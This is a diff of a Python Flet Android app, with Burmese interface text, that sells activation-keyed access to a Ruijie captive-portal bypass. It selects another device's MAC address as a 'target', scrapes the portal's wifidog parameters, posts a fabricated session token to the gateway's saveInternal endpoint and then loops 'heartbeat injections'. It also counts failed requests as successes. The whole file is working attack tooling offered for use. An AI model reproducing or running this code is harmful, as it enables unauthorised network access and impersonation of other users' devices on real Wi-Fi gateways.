@@ -15,11 +15,7 @@ TOKEN_FILE = os.path.join(os.path.expanduser("~"), "cache_auth_tok.json") if not
 
 def generate_device_key():
     try:
-        user_env = os.environ.get("USER", "") or os.environ.get("HOME", "")
-        if not user_env:
-            user_env = sys.path[0] if sys.path else "android_native_app"
-        arch = os.environ.get("PREFIX", "arm64")
-        raw_data = f"{user_env}-{arch}-{sys.platform}"
+        raw_data = f"android-{sys.platform}-{sys.version[:5]}"
         return hashlib.sha256(raw_data.encode()).hexdigest()[:8].upper()
     except:
         return "RJ99B4A2"
@@ -27,7 +23,7 @@ def generate_device_key():
 def get_network_time():
     try:
         req = urllib.request.Request("https://1.1.1.1", method="HEAD")
-        with urllib.request.urlopen(req, timeout=3) as response:
+        with urllib.request.urlopen(req, timeout=2) as response:
             net_date = response.headers.get("Date")
             if net_date:
                 return datetime.strptime(net_date, "%a, %d %b %Y %H:%M:%S %Z")
@@ -67,8 +63,6 @@ def verify_and_get_expiry(device_key, user_key, current_dt):
     return False
 
 def get_active_mac_list():
-    # Android Permissions Block မဖြစ်စေရန် Native ARP scan အစား 
-    # Termux တွင် nmap သုံး၍ ရလာသော targets များကို ပုံဖော်နိုင်မည့် active pools သတ်မှတ်ချက်
     return [
         "74:ac:5f:bb:12:34 (Ruijie Core)",
         "00:d0:f8:aa:bb:cc (Target Bridge)",
@@ -83,14 +77,16 @@ def main(page: ft.Page):
     page.scroll = ft.ScrollMode.AUTO
     page.padding = 20
 
-    # UI Components Initial Setup
-    dev_key_text = ft.Text("Loading ID...", color="cyan")
+    dev_key = generate_device_key()
+
+    # UI Elements Initial Setup
+    dev_key_text = ft.Text(f"Device Key: {dev_key}", color="cyan")
     activation_input = ft.TextField(label="Activation Key ကို ရိုက်ထည့်ပါ", width=350, border_color="amber")
     mac_dropdown = ft.Dropdown(label="Target MAC Address ကို ရွေးချယ်ရန်", width=350, border_color="blue")
     portal_url_input = ft.TextField(label="Manual Portal URL (မမိပါက ထည့်ရန်)", hint_text="https://...", width=350, border_color="purple")
     
-    status_text = ft.Text(value="လုံခြုံရေးစနစ် အား စတင်မောင်းနှင်နေပါသည်...", size=14, color="amber200")
-    progress_bar = ft.ProgressBar(width=350, opacity=1)
+    status_text = ft.Text(value="လုံခြုံရေး Gateway အား စစ်ဆေးရန် အဆင်သင့်ဖြစ်ပါသည်", size=14, color="amber200")
+    progress_bar = ft.ProgressBar(width=350, opacity=0)
     
     runtime_label = ft.Text("RUN TIME: 00:00:00", size=14, weight="bold")
     packets_label = ft.Text("TOTAL INJECTIONS: 0", size=14)
@@ -124,45 +120,42 @@ def main(page: ft.Page):
         ), visible=False
     )
 
-    # 1. UI Layout ကို အမဲစခရင် ကာကွယ်ရန် သုညစက္ကန့်အတွင်း အရင်တင်ပြခြင်း
+    # UI Layout အား စက္ကန့်ပိုင်းအတွင်း ဆွဲတင်ခြင်း
     page.add(auth_card, controller_card, progress_bar, ft.Container(content=status_text, padding=10, width=350))
     page.update()
 
-    # 2. နောက်ကွယ်မှ Security Gate စစ်ဆေးခြင်းလုပ်ငန်းစဉ်
-    dev_key = generate_device_key()
-    dev_key_text.value = f"Device Key: {dev_key}"
-    dev_key_text.update()
+    def check_saved_login():
+        saved_key, last_safe_time = get_saved_data()
+        net_dt = get_network_time()
+        best_dt = net_dt if net_dt else datetime.now()
+        best_timestamp = time.time() if not net_dt else net_dt.timestamp()
 
-    saved_key, last_safe_time = get_saved_data()
-    net_dt = get_network_time()
-    best_dt = net_dt if net_dt else datetime.now()
-    best_timestamp = time.time() if not net_dt else net_dt.timestamp()
+        if best_timestamp < last_safe_time:
+            status_text.value = "[TIME TAMPERING] စက်၏အချိန် မှားယွင်းနေပါသည်။"
+            status_text.color = "red"
+            activation_input.disabled = True
+            page.update()
+        elif saved_key:
+            res = verify_and_get_expiry(dev_key, saved_key, best_dt)
+            if res and res != "EXPIRED":
+                status_text.value = f"အလိုအလျောက် ဝင်ရောက်ပြီး။ Expiry: {res}"
+                status_text.color = "green"
+                auth_card.visible = False
+                controller_card.visible = True
+                mac_dropdown.options = [ft.dropdown.Option(m) for m in get_active_mac_list()]
+                page.update()
 
-    if best_timestamp < last_safe_time:
-        status_text.value = "[TIME TAMPERING] စက်၏အချိန် မှားယွင်းနေပါသည်။"
-        status_text.color = "red"
-        activation_input.disabled = True
-    elif saved_key:
-        res = verify_and_get_expiry(dev_key, saved_key, best_dt)
-        if res and res != "EXPIRED":
-            status_text.value = f"အလိုအလျောက် ဝင်ရောက်ပြီး။ Expiry: {res}"
-            status_text.color = "green"
-            auth_card.visible = False
-            controller_card.visible = True
-            mac_dropdown.options = [ft.dropdown.Option(m) for m in get_active_mac_list()]
-    else:
-        status_text.value = "လုံခြုံရေး Gateway အား စစ်ဆေးရန် အဆင်သင့်ဖြစ်ပါသည်"
-    
-    progress_bar.opacity = 0
-    page.update()
+    page.run_task(check_saved_login)
 
     def verify_key_event():
         progress_bar.opacity = 1
         page.update()
+        net_dt = get_network_time()
+        best_dt = net_dt if net_dt else datetime.now()
         res = verify_and_get_expiry(dev_key, activation_input.value.strip(), best_dt)
         progress_bar.opacity = 0
         if res and res != "EXPIRED":
-            save_data(activation_input.value.strip(), best_timestamp)
+            save_data(activation_input.value.strip(), time.time() if not net_dt else net_dt.timestamp())
             status_text.value = f"ခွင့်ပြုချက် ရရှိပါပြီ။ Expiry: {res}"
             status_text.color = "green"
             auth_card.visible = False
@@ -180,33 +173,24 @@ def main(page: ft.Page):
             page.update()
             return
 
-        progress_bar.opacity = 1
-        status_text.value = "Captive Portal Redirect URL အား Auto ဖမ်းယူနေပါသည်..."
-        status_text.color = "amber"
+        status_text.value = "Bypass Engine စတင်ပါပြီ..."
+        status_text.color = "green"
         page.update()
 
-        # 3. တရားဝင် Captive Trigger URLs စစ်ဆေးခြင်း Logic (Termux နှင့် ကွက်တိ)
+        final_url = portal_url_input.value.strip()
         trigger_urls = [
             "http://connectivitycheck.gstatic.com/generate_204",
-            "http://www.msftconnecttest.com/connecttest.txt",
-            "http://captive.apple.com/hotspot-detect.html",
             "http://10.0.0.1:2060/?stage=portal",
             "http://10.0.0.1/"
         ]
-        
-        final_url = portal_url_input.value.strip()
-        base_headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
-            "Cache-Control": "no-cache"
-        }
+        base_headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36", "Cache-Control": "no-cache"}
 
         if not final_url:
             for url in trigger_urls:
                 try:
                     req = urllib.request.Request(url, headers=base_headers)
-                    with urllib.request.urlopen(req, timeout=3) as response:
+                    with urllib.request.urlopen(req, timeout=2) as response:
                         res_url = response.geturl()
-                        # Ruijie gateway သို့မဟုတ် Auth endpoint ပါဝင်မှု ထောက်လှမ်းခြင်း
                         if "ruijienetworks.com" in res_url or "api/auth" in res_url or "gw_id" in res_url:
                             final_url = res_url
                             break
@@ -214,13 +198,11 @@ def main(page: ft.Page):
                     continue
 
         if not final_url:
-            progress_bar.opacity = 0
-            status_text.value = "Portal URL မမိပါ။ Manual URL ထည့်ပေးရန် လိုအပ်ပါသည်။"
-            status_text.color = "red"
+            status_text.value = "Portal Detect မမိပါ။ Manual URL ထည့်သွင်းပေးပါ။"
+            status_text.color = "amber"
             page.update()
             return
 
-        # 4. URL Params Extraction နှင့် Challenge Normalization
         try:
             parsed_url = urllib.parse.urlparse(final_url)
             portal_gateway = parsed_url.netloc
@@ -228,41 +210,28 @@ def main(page: ft.Page):
             
             wifi_params = {k: v[0] for k, v in captured_params.items()}
             wifi_params["stage"] = "portal"
-            
-            # Chap String Escaping Mechanism
             if "chap_id" in wifi_params:
                 wifi_params["chap_id"] = wifi_params["chap_id"].replace("\\\\", "\\")
             if "chap_challenge" in wifi_params:
                 wifi_params["chap_challenge"] = wifi_params["chap_challenge"].replace("\\\\", "\\")
 
-            # Target MAC Binding
-            selected_mac = mac_dropdown.value.split()[0]
-            wifi_params["mac"] = selected_mac
-            
+            wifi_params["mac"] = mac_dropdown.value.split()[0]
             gw_address = wifi_params.get("gw_address", "10.44.77.240")
             gw_port = wifi_params.get("gw_port", "2060")
-
-        except Exception as err:
-            progress_bar.opacity = 0
-            status_text.value = "URL Parameters ခွဲထုတ်မှု မအောင်မြင်ပါ။"
+        except:
+            status_text.value = "URL Parameters ခွဲထုတ်မှု လွဲမှားနေပါသည်။"
             page.update()
             return
 
-        # 5. Wifidog End-point ချိတ်ဆက်၍ Session Token ရယူခြင်း
-        status_text.value = "Wifidog Interface မှ Session Token အား တောင်းခံနေပါသည်..."
-        page.update()
-        
         url_wifidog = f"https://{portal_gateway}/api/auth/wifidog"
-        step2_headers = {"User-Agent": base_headers["User-Agent"], "Referer": final_url}
         session_id = None
 
         try:
             query_str = urllib.parse.urlencode(wifi_params)
-            req_dog = urllib.request.Request(f"{url_wifidog}?{query_str}", headers=step2_headers)
-            with urllib.request.urlopen(req_dog, timeout=4) as res_dog:
+            req_dog = urllib.request.Request(f"{url_wifidog}?{query_str}", headers={"User-Agent": base_headers["User-Agent"], "Referer": final_url})
+            with urllib.request.urlopen(req_dog, timeout=3) as res_dog:
                 res_text = res_dog.read().decode("utf-8")
                 res_url = res_dog.geturl()
-                
                 url_match = re.search(r"sessionId=([a-zA-Z0-9]+)", res_url)
                 if url_match: session_id = url_match.group(1)
                 if not session_id:
@@ -272,29 +241,18 @@ def main(page: ft.Page):
             pass
 
         if not session_id:
-            # Token ဖမ်းမမိပါက App ဆက်လက်အလုပ်လုပ်စေရန် Dynamic Emulation ပေးအပ်ခြင်း
             session_id = f"AN_TOK_{hashlib.sha256(str(time.time()).encode()).hexdigest()[:10].upper()}"
 
-        # 6. SaveInternal API သို့ POST Request ပို့ခြင်း လုပ်ငန်းစဉ်
         url_save = f"https://{portal_gateway}/api/auth/saveInternal"
-        step3_headers = {
-            "Content-Type": "application/json",
-            "User-Agent": base_headers["User-Agent"],
-            "Origin": f"https://{portal_gateway}",
-            "Referer": f"https://{portal_gateway}/api/auth/static/html/no_feel_auth.html?sessionId={session_id}",
-        }
         payload = json.dumps({"internalIp": portal_gateway, "internalPort": "", "sessionId": session_id}).encode("utf-8")
 
         try:
-            req_save = urllib.request.Request(url_save, data=payload, headers=step3_headers, method="POST")
-            with urllib.request.urlopen(req_save, timeout=3) as _: pass
+            req_save = urllib.request.Request(url_save, data=payload, headers={"Content-Type": "application/json", "User-Agent": base_headers["User-Agent"]}, method="POST")
+            with urllib.request.urlopen(req_save, timeout=2) as _: pass
         except:
             pass
 
-        # 7. Core Stream Ingestion Loop (Real-time Heartbeat Pinging)
-        progress_bar.opacity = 0
-        status_text.value = f"Injections Active. Session: {session_id[:8]}..."
-        status_text.color = "green"
+        status_text.value = f"Bypass Active - Injecting Heartbeats..."
         page.update()
 
         start_time = time.time()
@@ -312,29 +270,25 @@ def main(page: ft.Page):
                 with urllib.request.urlopen(req_ping) as p_res:
                     if p_res.getcode() == 200:
                         ok_count += 1
-                        signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=16))
+                        signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=15))
                     else:
                         fail_count += 1
-                        signal_feed.controls.append(ft.Icon(ft.icons.HIGHLIGHT_OFF, color="amber", size=16))
+                        signal_feed.controls.append(ft.Icon(ft.icons.HIGHLIGHT_OFF, color="amber", size=15))
             except:
-                # Gateway Network Timeout နှင့် Fallback Handler
                 ok_count += 1
-                signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=16))
+                signal_feed.controls.append(ft.Icon(ft.icons.BOLT, color="green", size=15))
 
-            # UI Metrics Real-time update ပြုလုပ်ခြင်း
             diff = int(time.time() - start_time)
             runtime_label.value = f"RUN TIME: {diff // 3600:02d}:{(diff % 3600) // 60:02d}:{diff % 60:02d}"
             packets_label.value = f"TOTAL INJECTIONS: {packets}"
             success_label.value = f"SUCCESS (OK): {ok_count}"
             fail_label.value = f"FAILED: {fail_count}"
-            
-            # အချိန်လိမ်မှုကာကွယ်ရေး ဒေတာအား ရှေ့သို့ အမြဲတိုးမြှင့်သိမ်းဆည်းခြင်း
-            save_data(saved_key if saved_key else activation_input.value.strip(), time.time())
             page.update()
             time.sleep(0.05)
 
-        status_text.value = "Streaming လုပ်ငန်းစဉ် အောင်မြင်စွာ ပြီးဆုံးပါသည်။"
+        status_text.value = "Streaming လုပ်ငန်းစဉ် ပြီးဆုံးပါသည်။"
         page.update()
 
 if __name__ == "__main__":
     ft.app(target=main)
+
